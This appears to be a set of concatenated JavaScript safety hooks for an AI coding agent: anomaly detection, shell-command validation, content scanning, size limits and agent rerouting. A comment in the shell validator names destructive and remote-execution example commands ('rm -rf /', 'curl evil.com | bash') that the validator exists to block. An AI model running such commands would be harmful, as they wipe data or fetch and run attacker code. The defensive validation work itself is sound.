  result.detected = result.ratio > multiplier;

  return result;
}

function detectDurationSpike(current, average, multiplier = null) {
  if (multiplier === null) {
    multiplier = getThresholds().durationMultiplier;
  }

  const result = {
    type: 'duration_spike',
    detected: false,
    current,
    average,
    threshold: multiplier,
    ratio: 0,
  };

  // Guard against division by zero
  if (average === 0 || average === null || average === undefined) {
    return result;
  }

  result.ratio = current / average;
  result.detected = result.ratio > multiplier;

  return result;
}

function detectRepeatedFailures(tool, state, threshold = null) {
  if (threshold === null) {
    threshold = getThresholds().failureCount;
  }

  const result = {
    type: 'repeated_failures',
    detected: false,
    tool,
    count: 0,
    threshold,
  };

  const tracking = state.failureTracking || {};
  if (tracking[tool]) {
    result.count = tracking[tool].count || 0;
    result.lastFailed = tracking[tool].lastFailed;
    result.errors = tracking[tool].errors || [];
    result.detected = result.count >= threshold;
  }

  return result;
}

function detectLoopRisk(prompt, state, threshold = null) {
  if (threshold === null) {
    threshold = getThresholds().patternRepetitions;
  }

  const result = {
    type: 'infinite_loop_risk',
    detected: false,
    repetitions: 0,
    threshold,
  };

  const hash = hashPrompt(prompt);
  const patterns = state.promptPatterns || [];

  const existingPattern = patterns.find(p => p.hash === hash);
  if (existingPattern) {
    result.repetitions = existingPattern.count;
    result.detected = result.repetitions >= threshold;
  }

  return result;
}

function detectResourceExhaustion(metrics) {
  const result = {
    type: 'resource_exhaustion',
    detected: false,
    warning: false,
    metrics: {},
  };

  // Use provided metrics or get from process
  const memMetrics = metrics || process.memoryUsage();

  const heapUsedRatio = memMetrics.heapUsed / memMetrics.heapTotal;

  result.metrics = {
    heapUsed: memMetrics.heapUsed,
    heapTotal: memMetrics.heapTotal,
    heapUsedRatio: heapUsedRatio,
    external: memMetrics.external,
  };

  if (heapUsedRatio >= HEAP_CRITICAL_THRESHOLD) {
    result.detected = true;
  } else if (heapUsedRatio >= HEAP_WARNING_THRESHOLD) {
    result.warning = true;
  }

  return result;
}

function logAnomaly(anomaly) {
  try {
    const dir = path.dirname(ANOMALY_LOG);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }

    const entry = {
      ...anomaly,
      timestamp: new Date().toISOString(),
    };

    appendJsonl(ANOMALY_LOG, entry, { maxLines: ANOMALY_LOG_MAX_LINES });

    if (process.env.DEBUG_HOOKS) {
      console.log('[anomaly-detector] Logged anomaly:', anomaly.type);
    }
  } catch (e) {
    if (process.env.DEBUG_HOOKS) {
      console.error('[anomaly-detector] Error logging anomaly:', e.message);
    }
  }
}

function recordFailure(tool, error, state) {
  if (!state.failureTracking) {
    state.failureTracking = {};
  }

  if (!state.failureTracking[tool]) {
    state.failureTracking[tool] = {
      count: 0,
      errors: [],
      lastFailed: null,
    };
  }

  state.failureTracking[tool].count++;
  state.failureTracking[tool].lastFailed = new Date().toISOString();

  // Keep last 5 errors
  state.failureTracking[tool].errors = [
    ...(state.failureTracking[tool].errors || []).slice(-4),
    error,
  ];
}

function recordTokenUsage(tokens, state) {
  if (!state.tokenHistory) {
    state.tokenHistory = [];
  }

  state.tokenHistory.push(tokens);

  // Limit history size
  if (state.tokenHistory.length > MAX_TOKEN_HISTORY) {
    state.tokenHistory = state.tokenHistory.slice(-MAX_TOKEN_HISTORY);
  }
}

function recordDuration(duration, state) {
  if (!state.durationHistory) {
    state.durationHistory = [];
  }

  state.durationHistory.push(duration);

  // Limit history size
  if (state.durationHistory.length > MAX_DURATION_HISTORY) {
    state.durationHistory = state.durationHistory.slice(-MAX_DURATION_HISTORY);
  }
}

function recordPromptPattern(prompt, state) {
  if (!state.promptPatterns) {
    state.promptPatterns = [];
  }

  const hash = hashPrompt(prompt);
  const existing = state.promptPatterns.find(p => p.hash === hash);

  if (existing) {
    existing.count++;
    existing.lastSeen = new Date().toISOString();
  } else {
    state.promptPatterns.push({
      hash,
      count: 1,
      lastSeen: new Date().toISOString(),
    });
  }

  // Limit patterns (remove oldest by lastSeen)
  if (state.promptPatterns.length > MAX_PROMPT_PATTERNS) {
    state.promptPatterns.sort(
      (a, b) => new Date(b.lastSeen).getTime() - new Date(a.lastSeen).getTime()
    );
    state.promptPatterns = state.promptPatterns.slice(0, MAX_PROMPT_PATTERNS);
  }
}

function clearFailures(tool, state) {
  if (state.failureTracking && state.failureTracking[tool]) {
    delete state.failureTracking[tool];
  }
}

async function main() {
  try {
    // Check if enabled
    if (!isEnabled()) {
      process.exit(0);
    }

    // PERF-006/PERF-007: Use shared hook-input.cjs utility
    const hookInput = await parseHookInputAsync();

    if (!hookInput) {
      process.exit(0);
    }

    // Load state
    const state = loadState();
    const thresholds = getThresholds();
    const anomalies = [];

    // Extract relevant data from hook input using shared helpers
    const tokenCount = hookInput.tokens || hookInput.token_count || null;
    const duration = hookInput.duration || hookInput.execution_time || null;
    const tool = getToolName(hookInput);
    const toolError = hookInput.error || null;
    const toolSuccess = hookInput.success !== false && !toolError;
    const prompt = hookInput.prompt || hookInput.user_message || null;

    // 1. Check for token explosion
    if (tokenCount !== null) {
      const avgTokens = calculateAverage(state.tokenHistory);
      const tokenResult = detectTokenExplosion(tokenCount, avgTokens, thresholds.tokenMultiplier);
      if (tokenResult.detected) {
        anomalies.push(tokenResult);
      }
      recordTokenUsage(tokenCount, state);
    }

    // 2. Check for duration spike
    if (duration !== null) {
      const avgDuration = calculateAverage(state.durationHistory);
      const durationResult = detectDurationSpike(
        duration,
        avgDuration,
        thresholds.durationMultiplier
      );
      if (durationResult.detected) {
        anomalies.push(durationResult);
      }
      recordDuration(duration, state);
    }

    // 3. Track tool failures
    if (tool) {
      if (!toolSuccess && toolError) {
        recordFailure(tool, toolError, state);
        const failureResult = detectRepeatedFailures(tool, state, thresholds.failureCount);
        if (failureResult.detected) {
          anomalies.push(failureResult);
        }
      } else if (toolSuccess) {
        // Clear failure tracking on success
        clearFailures(tool, state);
      }
    }

    // 4. Check for loop risk
    if (prompt) {
      const loopResult = detectLoopRisk(prompt, state, thresholds.patternRepetitions);
      if (loopResult.detected) {
        anomalies.push(loopResult);
      }
      recordPromptPattern(prompt, state);
    }

    // 5. Check resource exhaustion
    const resourceResult = detectResourceExhaustion(null);
    if (resourceResult.detected || resourceResult.warning) {
      anomalies.push(resourceResult);
    }

    // Log all detected anomalies
    for (const anomaly of anomalies) {
      logAnomaly(anomaly);
    }

    // Save updated state
    saveState(state);

    // Always exit successfully (advisory hook)
    process.exit(0);
  } catch (err) {
    if (process.env.DEBUG_HOOKS) {
      console.error('[anomaly-detector] Error:', err.message);
      console.error('Stack:', err.stack);
    }
    // Fail silently
    process.exit(0);
  }
}

function sanitizeNullDevice(command) {
  if (!isWindows) {
    return command;
  }

  // Replace all instances of /dev/null with NUL
  // Handle various redirect patterns
  let sanitized = command;

  // Pattern: /dev/null (the actual device reference)
  sanitized = sanitized.replace(/\/dev\/null/g, 'NUL');

  return sanitized;
}

async function main() {
  try {
    // Skip on non-Windows platforms
    if (!isWindows) {
      process.exit(0);
    }

    // PERF-006/PERF-007: Use shared hook-input.cjs utility
    const hookInput = await parseHookInputAsync();

    if (!hookInput) {
      process.exit(0);
    }

    // Verify this is a Bash tool call using shared helper
    const toolName = getToolName(hookInput);
    if (toolName !== 'Bash') {
      process.exit(0);
    }

    // Extract the command using shared helper
    const toolInputData = getToolInput(hookInput);
    const command = toolInputData.command;

    if (!command || typeof command !== 'string') {
      process.exit(0);
    }

    // Check if command contains /dev/null
    if (!command.includes('/dev/null')) {
      process.exit(0);
    }

    // Sanitize the command
    const sanitizedCommand = sanitizeNullDevice(command);

    // Output the modified tool_input to update the command
    const modifiedInput = {
      ...toolInputData,
      command: sanitizedCommand,
    };

    // Output JSON to modify the command
    console.log(JSON.stringify({ tool_input: modifiedInput }));
    process.exit(0);
  } catch (err) {
    // On any error, fail open
    if (process.env.DEBUG_HOOKS) {
      console.error('Windows null sanitizer error:', err.message);
    }
    process.exit(0);
  }
}

function checkDangerousPatterns(command) {
  if (!command || typeof command !== 'string') {
    return { valid: true, error: '' };
  }

  // Check dangerous syntax patterns
  for (const { pattern, name, reason } of DANGEROUS_PATTERNS) {
    if (pattern.test(command)) {
      return {
        valid: false,
        error: `SEC-AUDIT-012: ${name} blocked - ${reason}`,
      };
    }
  }

  // Check dangerous shell builtins
  for (const { pattern, name, reason } of DANGEROUS_BUILTINS) {
    if (pattern.test(command)) {
      return {
        valid: false,
        error: `SEC-AUDIT-012: ${name} blocked - ${reason}`,
      };
    }
  }

  return { valid: true, error: '' };
}

function parseCommandLegacy(commandString) {
  const result = parseCommand(commandString, { skipDangerousCheck: true });
  return result.tokens;
}

function extractCArgument(commandString) {
  // Use legacy parser (no dangerous check) since we check at validation time
  const result = parseCommand(commandString, { skipDangerousCheck: true });

  if (result.tokens === null || result.tokens.length < 3) {
    return { command: null, error: result.error };
  }

  const tokens = result.tokens;

  // Look for -c flag (standalone or combined with other flags like -xc, -ec, -ic)
  for (let i = 0; i < tokens.length; i++) {
    const token = tokens[i];

    // Check for standalone -c or combined flags containing 'c'
    // Combined flags: -xc, -ec, -ic, -exc, etc. (short options bundled together)
    const isCFlag =
      token === '-c' ||
      (token.startsWith('-') && !token.startsWith('--') && token.slice(1).includes('c'));

    if (isCFlag && i + 1 < tokens.length) {
      // The next token is the command to execute
      return { command: tokens[i + 1], error: null };
    }
  }

  return { command: null, error: null };
}

function extractCArgumentLegacy(commandString) {
  const result = extractCArgument(commandString);
  return result.command;
}

function validateShellCommand(commandString) {
  // SEC-AUDIT-012: Check for dangerous patterns FIRST, before any parsing
  const dangerCheck = checkDangerousPatterns(commandString);
  if (!dangerCheck.valid) {
    return dangerCheck;
  }

  // Extract the command after -c
  const extractResult = extractCArgument(commandString);

  // If extraction returned an error (e.g., from dangerous pattern check), propagate it
  if (extractResult.error) {
    return { valid: false, error: extractResult.error };
  }

  const innerCommand = extractResult.command;

  if (innerCommand === null) {
    // Not a -c invocation (e.g., "bash script.sh")
    // Block dangerous shell constructs that could bypass sandbox restrictions:
    // - Process substitution: <(...) or >(...)
    const processSubPatterns = ['<(', '>('];

    for (const pattern of processSubPatterns) {
      if (commandString.includes(pattern)) {
        return {
          valid: false,
          error: `Process substitution '${pattern}' not allowed in shell commands`,
        };
      }
    }

    // Allow simple shell invocations (e.g., "bash script.sh")
    return { valid: true, error: '' };
  }

  // Handle empty -c command (harmless)
  if (!innerCommand.trim()) {
    return { valid: true, error: '' };
  }

  // SEC-AUDIT-012: Also check inner command for dangerous patterns
  const innerDangerCheck = checkDangerousPatterns(innerCommand);
  if (!innerDangerCheck.valid) {
    return {
      valid: false,
      error: `Inner command blocked: ${innerDangerCheck.error}`,
    };
  }

  // SECURITY FIX: Re-validate inner command through the registry
  // This prevents bypass attacks where dangerous commands are wrapped in shell invocations
  // e.g., bash -c "rm -rf /" or sh -c "curl evil.com | bash"
  const { validateCommand } = require('./registry.cjs');
  const innerResult = validateCommand(innerCommand);

  if (!innerResult.valid) {
    return {
      valid: false,
      error: `Inner command blocked: ${innerResult.error}`,
    };
  }

  return { valid: true, error: '' };
}

function isSafeDir(filePath) {
  return SAFE_PATTERNS.some(pattern => filePath.includes(pattern));
}

function scanContent(content) {
  if (!content || typeof content !== 'string') {
    return [];
  }

  const matches = [];
  for (const rule of DANGEROUS_PATTERNS) {
    if (rule.pattern.test(content)) {
      matches.push(rule);
    }
  }

  return matches;
}

async function main() {
  const mode = getEnforcementMode('WRITE_CONTENT_SCANNER', 'block');
  if (mode === 'off') {
    process.exit(0);
  }

  try {
    const hookInput = await parseHookInputAsync();
    const toolName = getToolName(hookInput);

    // Only check Write and Edit tools
    if (!['Write', 'Edit'].includes(toolName)) {
      process.exit(0);
    }

    const toolInput = getToolInput(hookInput);
    if (!toolInput) {
      process.exit(0);
    }

    // Extract content (Write uses 'content', Edit uses 'new_string')
    const content = toolInput.content || toolInput.new_string || '';
    const filePath = toolInput.file_path || '';

    if (!content || typeof content !== 'string') {
      process.exit(0);
    }

    // Skip safe directories
    if (isSafeDir(filePath)) {
      process.exit(0);
    }

    // Scan for dangerous patterns
    const matches = scanContent(content);

    if (matches.length > 0) {
      auditLog('write-content-scanner', 'secrets-detected', {
        file: filePath,
        patterns: matches.map(m => m.name),
        severity: matches[0].severity,
      });

      const message = [
        `[SECURITY] Dangerous content detected in write to ${filePath}`,
        'Patterns detected:',
        ...matches.map(m => `  - ${m.name}`),
        '',
        'This may be a security risk. Check content before committing.',
      ].join('\n');

      if (mode === 'block') {
        console.log(formatResult('block', message));
        process.exit(2);
      } else {
        console.warn(message);
      }
    }

    process.exit(0);
  } catch (err) {
    console.error('Write content scanner error:', err.message);
    process.exit(0); // Fail open on errors
  }
}

async function handler(input) {
  const { command } = input;

  // Check enforcement mode
  const mode = process.env.VARIABLE_QUOTING_VALIDATOR || 'warn';

  if (mode === 'off') {
    return { allowed: true };
  }

  // Detect unquoted variables
  const unquotedVars = detectUnquotedVariables(command);

  if (unquotedVars.length === 0) {
    return { allowed: true };
  }

  // Check if any unquoted variables are in dangerous contexts
  const dangerousContexts = detectDangerousContexts(command, unquotedVars);

  const varList = unquotedVars.map(v => v.original).join(', '); // Use original ($VAR) instead of just name (VAR)
  const priority = dangerousContexts.length > 0 ? 'HIGH' : '';
  const contextInfo =
    dangerousContexts.length > 0 ? ` (dangerous contexts: ${dangerousContexts.join(', ')})` : '';

  const message = `[VARIABLE-QUOTING${priority ? `-${priority}` : ''}] unquoted variables detected: ${varList}${contextInfo}. Use "$VAR" instead of $VAR`;
  const fix = `Quote variables: ${unquotedVars.map(v => `"${v.original}"`).join(', ')}`;

  if (mode === 'warn') {
    return {
      allowed: true,
      warning: message,
      fix,
    };
  }

  // block mode
  return {
    allowed: false,
    reason: message,
    fix,
  };
}

function detectUnquotedVariables(command) {
  const unquoted = [];

  // Pattern: $VAR or ${VAR} NOT within quotes
  // Negative lookbehind/lookahead for quotes
  const varPattern = /(?<!["'])\$(\{)?([A-Z_][A-Z0-9_]*)(\})?(?!["'])/g;

  let match;
  while ((match = varPattern.exec(command)) !== null) {
    const [original, _openBrace, varName, _closeBrace] = match;

    // Skip special shell variables ($$, $?, $!, $0-$9)
    if (isSpecialVariable(varName)) {
      continue;
    }

    // Check if this variable is actually within quotes (regex can miss some cases)
    const beforeVar = command.substring(0, match.index);
    const inDoubleQuotes = (beforeVar.match(/"/g) || []).length % 2 === 1;
    const inSingleQuotes = (beforeVar.match(/'/g) || []).length % 2 === 1;

    if (inDoubleQuotes || inSingleQuotes) {
      continue;
    }

    unquoted.push({
      name: varName,
      original: original,
    });
  }

  return unquoted;
}

function detectDangerousContexts(command, _unquotedVars) {
  const contexts = [];

  // Dangerous commands that should NEVER have unquoted variables
  const dangerousCommands = [
    { pattern: /\bcd\s+\$[A-Z_][A-Z0-9_]*/gi, context: 'cd' },
    { pattern: /\bfind\s+\$[A-Z_][A-Z0-9_]*/gi, context: 'find' },
    { pattern: /\brm\s+.*\$[A-Z_][A-Z0-9_]*/gi, context: 'rm' },
    { pattern: /\bmv\s+.*\$[A-Z_][A-Z0-9_]*/gi, context: 'mv' },
    { pattern: /\bcp\s+.*\$[A-Z_][A-Z0-9_]*/gi, context: 'cp' },
    { pattern: /\bchmod\s+.*\$[A-Z_][A-Z0-9_]*/gi, context: 'chmod' },
    { pattern: /\bchown\s+.*\$[A-Z_][A-Z0-9_]*/gi, context: 'chown' },
  ];

  for (const { pattern, context: ctx } of dangerousCommands) {
    if (pattern.test(command)) {
      contexts.push(ctx);
    }
  }

  return [...new Set(contexts)]; // Deduplicate
}

function estimateTokens(content) {
  if (!content || typeof content !== 'string') {
    return 0;
  }
  return Math.ceil(content.length / 4);
}

function extractContent(toolName, toolInput) {
  if (!toolInput) {
    return null;
  }

  switch (toolName) {
    case 'Write':
    case 'NotebookEdit':
      return toolInput.content || null;

    case 'Edit':
      // For Edit, check new_string (the replacement content)
      return toolInput.new_string || null;

    default:
      return null;
  }
}

function validateContentSize(input) {
  const toolName = getToolName(input);
  const toolInput = getToolInput(input);

  // Skip validation for non-write tools
  if (!VALIDATED_TOOLS.includes(toolName)) {
    return { decision: 'allow', reason: 'Not a write tool' };
  }

  // Extract content
  const content = extractContent(toolName, toolInput);

  // Allow if no content (empty writes are valid)
  if (!content) {
    return { decision: 'allow', reason: 'No content to validate' };
  }

  // Estimate tokens
  const estimatedTokens = estimateTokens(content);
  const filePath = toolInput.file_path || toolInput.notebook_path || 'unknown';

  // Check against limits
  if (estimatedTokens > MAX_TOKENS) {
    return {
      decision: 'block',
      reason: `Content too large: ~${estimatedTokens} tokens (max: ${MAX_TOKENS})`,
      file: filePath,
      suggestion: 'Split content into multiple smaller files or reduce content size',
      estimatedTokens,
      maxTokens: MAX_TOKENS,
    };
  }

  if (estimatedTokens >= WARNING_THRESHOLD) {
    return {
      decision: 'warn',
      reason: `Large content: ~${estimatedTokens} tokens (warning threshold: ${WARNING_THRESHOLD})`,
      file: filePath,
      estimatedTokens,
      warningThreshold: WARNING_THRESHOLD,
    };
  }

  return { decision: 'allow', reason: `Content size OK: ~${estimatedTokens} tokens` };
}

async function main() {
  try {
    // Parse input
    const input = await parseHookInputAsync({ allowEmpty: true });

    // Allow if no input (fail open)
    if (!input) {
      auditLog('write-size-validator', 'No input, allowing');
      process.exit(0);
    }

    // Validate content size
    const result = validateContentSize(input);

    // Log decision
    auditLog('write-size-validator', `Decision: ${result.decision}`, { result });

    // Handle blocking
    if (result.decision === 'block') {
      console.error(
        JSON.stringify({
          decision: result.decision,
          reason: result.reason,
          file: result.file,
          suggestion: result.suggestion,
          estimatedTokens: result.estimatedTokens,
          maxTokens: result.maxTokens,
        })
      );
      try {
        await eventBus.emit(EventTypes.TOOL_BLOCKED, {
          type: EventTypes.TOOL_BLOCKED,
          timestamp: new Date().toISOString(),
          toolName: 'Write',
          reason: 'write_size_exceeded',
        });
      } catch (_err) {
        // Best-effort
      }
      process.exit(2); // Block
    }

    // Handle warning
    if (result.decision === 'warn') {
      console.error(
        JSON.stringify({
          decision: result.decision,
          reason: result.reason,
          file: result.file,
          estimatedTokens: result.estimatedTokens,
          warningThreshold: result.warningThreshold,
        })
      );
    }

    // Allow
    process.exit(0);
  } catch (error) {
    // Fail open on error (SEC-008)
    auditLog('write-size-validator', 'Error (fail open)', { error: error.message });
    console.error(`write-size-validator error: ${error.message}`);
    process.exit(0);
  }
}

function setStateFile(filePath) {
  STATE_FILE = filePath;
}

function isEnabled() {
  const mode = process.env.REROUTER_MODE || 'suggest';
  return mode !== 'off';
}

function createDefaultState() {
  return {
    agentFailures: {},
    taskStartTimes: {},
    modelUsage: {},
    lastUpdated: new Date().toISOString(),
  };
}

function loadState() {
  try {
    if (fs.existsSync(STATE_FILE)) {
      const content = fs.readFileSync(STATE_FILE, 'utf8');
      // SEC-007: Use safe JSON parsing with schema validation
      const state = safeParseJSON(content, 'rerouter-state');
      return {
        ...createDefaultState(),
        ...state,
      };
    }
  } catch (e) {
    if (process.env.DEBUG_HOOKS) {
      console.error('[auto-rerouter] Error loading state:', e.message);
    }
  }
  return createDefaultState();
}

function saveState(state) {
  try {
    const dir = path.dirname(STATE_FILE);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    state.lastUpdated = new Date().toISOString();
    // Use atomic write: writes to temp file, then renames (atomic on POSIX)
    atomicWriteJSONSync(STATE_FILE, state);
  } catch (e) {
    if (process.env.DEBUG_HOOKS) {
      console.error('[auto-rerouter] Error saving state:', e.message);
    }
  }
}

function recordAgentFailure(agent, error) {
  const state = loadState();

  if (!state.agentFailures[agent]) {
    state.agentFailures[agent] = {
      count: 0,
      errors: [],
      lastFailed: null,
    };
  }

  state.agentFailures[agent].count++;
  state.agentFailures[agent].lastFailed = new Date().toISOString();
  state.agentFailures[agent].errors = [
    ...(state.agentFailures[agent].errors || []).slice(-4),
    error,
  ];

  saveState(state);
}

function clearAgentFailures(agent) {
  const state = loadState();
  if (state.agentFailures[agent]) {
    delete state.agentFailures[agent];
    saveState(state);
  }
}

function checkAgentFailures(agent) {
  const state = loadState();

  const result = {
    type: 'agent_failure',
    detected: false,
    shouldReroute: false,
    suggestion: '',
    agent,
    failureCount: 0,
  };

  if (state.agentFailures[agent]) {
    result.failureCount = state.agentFailures[agent].count;

    if (result.failureCount >= AGENT_FAILURE_THRESHOLD) {
      result.detected = true;
      result.shouldReroute = true;

      const alternatives = AGENT_ALTERNATIVES[agent.toLowerCase()] || ['developer'];
      const alternative = alternatives[0];

      result.suggestion = `try ${alternative} instead of ${agent}`;
      result.alternatives = alternatives;
    }
  }

  return result;
}

function detectSkillNotFound(input) {
  const result = {
    type: 'skill_not_found',
    detected: false,
    suggestion: '',
    skillName: null,
  };

  const toolName = input.tool_name || input.tool;
  const error = input.error || '';

  if (toolName !== 'Skill') {
    return result;
  }

  if (!error) {
    return result;
  }

  // Pattern: Skill "X" not found
  const match = error.match(/[Ss]kill "([^"]+)" not found/);
  if (match) {
    result.detected = true;
    result.skillName = match[1];
    result.suggestion = `skill "${match[1]}" not found, consider using evolution via skill-creator to create it`;
  }

  return result;
}

function recordModelUsage(model) {
  const state = loadState();

  if (!state.modelUsage) {
    state.modelUsage = {};
  }

  state.modelUsage[model] = (state.modelUsage[model] || 0) + 1;
  saveState(state);
}

function checkResourceConstraints() {
  const state = loadState();

  const result = {
    type: 'resource_constraint',
    detected: false,
    suggestion: '',
    model: null,
    usage: 0,
  };

  const opusUsage = state.modelUsage?.opus || 0;

  if (opusUsage >= OPUS_USAGE_THRESHOLD) {
    result.detected = true;
    result.model = 'opus';
    result.usage = opusUsage;
    result.suggestion = 'switch to sonnet or haiku model to reduce resource usage';
  }

  return result;
}

function recordTaskStart(taskId, timestamp = null) {
  const state = loadState();

  if (!state.taskStartTimes) {
    state.taskStartTimes = {};
  }

  state.taskStartTimes[taskId] = timestamp || new Date().toISOString();
  saveState(state);
}

function clearTaskStart(taskId) {
  const state = loadState();

  if (state.taskStartTimes && state.taskStartTimes[taskId]) {
    delete state.taskStartTimes[taskId];
    saveState(state);
  }
}

function checkTaskStuck(taskId) {
  const state = loadState();

  const result = {
    type: 'task_stuck',
    detected: false,
    suggestion: '',
    taskId,
    durationMinutes: 0,
  };

  const startTime = state.taskStartTimes?.[taskId];
  if (!startTime) {
    return result;
  }

  const startDate = new Date(startTime);
  const now = new Date();
  const durationMs = now.getTime() - startDate.getTime();
  const durationMinutes = durationMs / (1000 * 60);

  result.durationMinutes = Math.round(durationMinutes * 10) / 10;

  if (durationMinutes >= TASK_STUCK_MINUTES) {
    result.detected = true;
    result.suggestion = `decompose task ${taskId} into smaller subtasks (running for ${result.durationMinutes} min)`;
  }

  return result;
}

function extractAgentFromPrompt(prompt) {
  if (!prompt) return null;

  // Pattern: "You are the X agent"
  let match = prompt.match(/You are the (\w+) agent/i);
  if (match) {
    return match[1].toLowerCase();
  }

  // Pattern: "You are AGENT" (all caps)
  match = prompt.match(/You are (\w+)\./i);
  if (match) {
    const agent = match[1].toLowerCase();
    // Check if it's a known agent name
    if (
      AGENT_ALTERNATIVES[agent] ||
      ['developer', 'planner', 'architect', 'qa', 'devops', 'security-architect'].includes(agent)
    ) {
      return agent;
    }
  }

  return null;
}

function getSuggestions(input) {
  const suggestions = [];

  // PERF-006/PERF-007: Use shared hook-input.cjs utilities
  const toolName = getToolName(input);
  const error = input.error;
  const toolInput = getToolInput(input);

  // 1. Check for Skill not found
  if (toolName === 'Skill' && error) {
    const skillResult = detectSkillNotFound(input);
    if (skillResult.detected) {
      suggestions.push(skillResult);
    }
  }

  // 2. Check for Task failures (agent failures)
  if (toolName === 'Task' && error) {
    const prompt = toolInput.prompt || '';
    const agent = extractAgentFromPrompt(prompt);

    if (agent) {
      recordAgentFailure(agent, error);
      const agentResult = checkAgentFailures(agent);
      if (agentResult.shouldReroute) {
        suggestions.push(agentResult);
      }
    }
  }

  // 3. Check resource constraints
  const resourceResult = checkResourceConstraints();
  if (resourceResult.detected) {
    suggestions.push(resourceResult);
  }

  return suggestions;
}

async function main() {
  try {
    // Check if enabled
    if (!isEnabled()) {
      process.exit(0);
    }

    // PERF-006/PERF-007: Use shared hook-input.cjs utility
    const hookInput = await parseHookInputAsync();

    if (!hookInput) {
      process.exit(0);
    }

    // Get suggestions
    const suggestions = getSuggestions(hookInput);

    // Log suggestions in suggest mode
    const mode = process.env.REROUTER_MODE || 'suggest';
    if (mode === 'suggest' && suggestions.length > 0) {
      for (const suggestion of suggestions) {
        console.log(`[auto-rerouter] ${suggestion.type}: ${suggestion.suggestion}`);
      }
    }

    // Always exit successfully (advisory hook)
    process.exit(0);
  } catch (err) {
    if (process.env.DEBUG_HOOKS) {
      console.error('[auto-rerouter] Error:', err.message);
      console.error('Stack:', err.stack);
    }
    // Fail silently
    process.exit(0);
  }
}

function readFileSafe(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf-8');
  } catch (_err) {
    return null;
  }
}

function getArtifactType(artifactPath) {
  const normalizedPath = artifactPath.replace(/\\/g, '/');

  if (normalizedPath.includes('/agents/')) return 'agent';
  if (normalizedPath.includes('/skills/')) return 'skill';
  if (normalizedPath.includes('/workflows/')) return 'workflow';
  if (normalizedPath.includes('/hooks/')) return 'hook';

  return 'unknown';
}

function getArtifactName(artifactPath) {
  const normalizedPath = artifactPath.replace(/\\/g, '/');
  const parts = normalizedPath.split('/');
  const filename = parts[parts.length - 1];
  return filename.replace(/\.(md|cjs|mjs|json)$/, '');
}

function quickValidate(artifactPath) {
  const issues = [];
  const artifactType = getArtifactType(artifactPath);
  const artifactName = getArtifactName(artifactPath);

  // Check if artifact file exists
  const absolutePath = path.isAbsolute(artifactPath)
    ? artifactPath
    : path.join(PROJECT_ROOT, artifactPath);

  if (!fs.existsSync(absolutePath)) {
    return { passed: false, issues: ['Artifact file not found'] };
  }

  // Check CLAUDE.md for agents/workflows
  if (['agent', 'workflow'].includes(artifactType)) {
    const claudeMd = readFileSafe(CLAUDE_MD);
    if (claudeMd && !claudeMd.toLowerCase().includes(artifactName.toLowerCase())) {
      issues.push('Missing CLAUDE.md routing entry');
    }
  }

  // Check skill catalog for skills
  if (artifactType === 'skill') {
    const catalog = readFileSafe(SKILL_CATALOG);
    if (catalog && !catalog.toLowerCase().includes(artifactName.toLowerCase())) {
      issues.push('Missing skill catalog entry');
    }
  }

  // Check routing table for agents
  if (artifactType === 'agent') {
    const enforcer = readFileSafe(ROUTER_ENFORCER);
    if (enforcer && !enforcer.toLowerCase().includes(artifactName.toLowerCase())) {
      issues.push('Missing routing-table keywords');
    }
  }

  return {
    passed: issues.length === 0,
    issues,
  };
}

function getRecentEvolutions(hoursAgo = 24) {
  const stateContent = readFileSafe(EVOLUTION_STATE);
  if (!stateContent) return [];

  try {
    const state = JSON.parse(stateContent);
    const cutoff = Date.now() - hoursAgo * 60 * 60 * 1000;
    const recent = [];

    // Check completed evolutions
    if (state.evolutions) {
      for (const evolution of state.evolutions) {
        if (evolution.completedAt) {
          const completedAt = new Date(evolution.completedAt).getTime();
          if (completedAt > cutoff) {
            recent.push({
              name: evolution.name,
              type: evolution.type,
              path: evolution.path,
              completedAt: evolution.completedAt,
            });
          }
        }
      }
    }

    // Check current evolution (if in progress)
    if (state.currentEvolution?.artifacts) {
      for (const artifact of state.currentEvolution.artifacts) {
        recent.push({
          name: artifact.name,
          type: artifact.type,
          path: artifact.path,
          completedAt: null, // In progress
        });
      }
    }

    return recent;
  } catch (_err) {
    return [];
  }
}

function timeAgo(dateStr) {
  if (!dateStr) return 'in progress';

  const now = Date.now();
  const then = new Date(dateStr).getTime();
  const diffHours = Math.floor((now - then) / (1000 * 60 * 60));

  if (diffHours < 1) return 'just now';
  if (diffHours === 1) return '1 hour ago';
  if (diffHours < 24) return `${diffHours} hours ago`;

  const diffDays = Math.floor(diffHours / 24);
  if (diffDays === 1) return '1 day ago';
  return `${diffDays} days ago`;
}

function hasRunRecently() {
  try {
    if (!fs.existsSync(LAST_RUN_FILE)) {
      return false;
    }

    const lastRunTime = parseInt(fs.readFileSync(LAST_RUN_FILE, 'utf-8').trim(), 10);
    const fourHoursAgo = Date.now() - 4 * 60 * 60 * 1000;

    return lastRunTime > fourHoursAgo;
  } catch (_err) {
    return false; // If error, run the hook
  }
}

function recordRun() {
  try {
    const tmpDir = path.dirname(LAST_RUN_FILE);
    if (!fs.existsSync(tmpDir)) {
      fs.mkdirSync(tmpDir, { recursive: true });
    }
    fs.writeFileSync(LAST_RUN_FILE, Date.now().toString(), 'utf-8');
  } catch (_err) {
    // Ignore errors (don't block on timestamp write)
  }
}

function main() {
  // Check if run recently (within last 4 hours)
  if (hasRunRecently()) {
    process.exit(0); // Skip - ran recently
  }

  // Record this run
  recordRun();

  // Get recent evolutions (last 24 hours)
  const recentEvolutions = getRecentEvolutions(24);

  if (recentEvolutions.length === 0) {
    // No recent artifacts, nothing to remind about
    process.exit(0);
  }

  // Check each for integration issues
  const artifactsWithIssues = [];

  for (const evolution of recentEvolutions) {
    if (evolution.path) {
      const validation = quickValidate(evolution.path);
      if (!validation.passed) {
        artifactsWithIssues.push({
          ...evolution,
          issues: validation.issues,
        });
      }
    }
  }

  if (artifactsWithIssues.length === 0) {
    // All recent artifacts are properly integrated
    process.exit(0);
  }

  // Output reminder
  console.log('\n+----------------------------------------------------------+');
  console.log('| POST-CREATION VALIDATION REMINDER                        |');
  console.log('+----------------------------------------------------------+');
  console.log('| The following recently created artifacts may have        |');
  console.log('| incomplete integration:                                  |');
  console.log('|                                                          |');

  for (const artifact of artifactsWithIssues) {
    const typeStr = artifact.type.padEnd(8);
    const nameStr = artifact.name.substring(0, 25).padEnd(25);
    const whenStr = timeAgo(artifact.completedAt);
    console.log(`|  [${typeStr}] ${nameStr} (${whenStr})`);

